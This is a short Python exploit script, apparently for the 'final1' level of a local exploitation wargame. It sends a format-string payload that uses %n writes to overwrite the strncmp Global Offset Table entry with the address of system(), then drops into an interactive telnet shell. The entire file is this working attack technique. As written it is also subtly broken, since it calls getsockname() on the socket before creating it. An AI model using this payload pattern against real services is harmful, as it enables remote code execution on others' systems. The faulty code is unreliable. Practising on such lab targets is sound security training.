import socket
import struct
import telnetlib

HOST = "127.0.0.1"
PORT = 2994

# Address of strncmp function in Global Offset Table
strncmp1 = struct.pack("I", 0x804a1a8)
# address of second half of strncmp function
strncmp2 = struct.pack("I", 0x804a1a8+2)

# Offset to create value 0xffb0 - second half of system address
offset1 = "%65408x"
# Offset to create value 0x1b7ec (simply 0xb7ec when placed properly) - first half of system address
offset2 = "%47164x"

# Write to strncmp1 (above)
write1 = "%17$n"
# Write to strncmp2 (above)
write2 = "%18$n"

# Ensures padding consistency
ip, port = s.getsockname()
hostname = ip + ":" + str(port)
padding = "A"*(24 - len(hostname))

# Username exploit
username = padding + strncmp1 + strncmp2 + offset1 + write1 + offset2 + write2
# Arbitrary login info
login = "kitten fuzz"

# Reads until specified string is obtained
def read_until(string):
   buffer = ""
   while string not in buffer:
      buffer += s.recv(1)
   return buffer

# Establishes connection
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# Sends username exploit to server
read_until("[final1] $ ")
s.send("username " + username + "\n")

# Sends arbitrary login info to server
read_until("[final1] $ ")
s.send("login " + login + "\n")

# Opens interactive Telnet terminal with server
t = telnetlib.Telnet()
t.sock = s
t.interact()
